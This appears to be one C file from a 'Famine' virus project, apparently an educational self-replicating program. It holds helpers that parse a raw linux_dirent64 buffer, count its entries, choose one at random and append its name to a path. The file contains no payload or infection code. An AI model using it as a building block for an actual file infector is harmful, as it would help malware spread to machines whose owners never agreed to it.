#include <famine.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

static inline void update_path(char *path, const char *file)
{
	const size_t p_limit = _strlen(path);
	const size_t f_limit = _strlen(file);

	_bzero(path + p_limit, PATH_MAX - p_limit);

	for (size_t index = 0; index < f_limit; index++)
		path[p_limit + index] = file[index];
}

static inline void update_entry(struct directory *dir, const char *dirent)
{
	size_t index = 0;
	size_t reclen = 0;

	while (dirent[index])
	{
		reclen = ((struct linux_dirent64 *)(dirent + index))->d_reclen;
		index += reclen;
		dir->entry += 1;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

int8_t update_directory(struct directory *dir, const char *dirent)
{
	size_t index = 0;
	size_t entry = 0;
	size_t reclen = 0;

	update_entry(dir, dirent);

	if (dir->entry == 0)
		return FAILURE;

	const size_t r_entry = _get_random_integer(dir->entry);

	while (dirent[index])
	{
		if (entry == r_entry)
			break ;
		reclen = ((struct linux_dirent64 *)(dirent + index))->d_reclen;
		index += reclen;
		entry += 1;
	}

	update_path(dir->path, ((struct linux_dirent64 *)(dirent + index))->d_name);

	return SUCCESS;
}
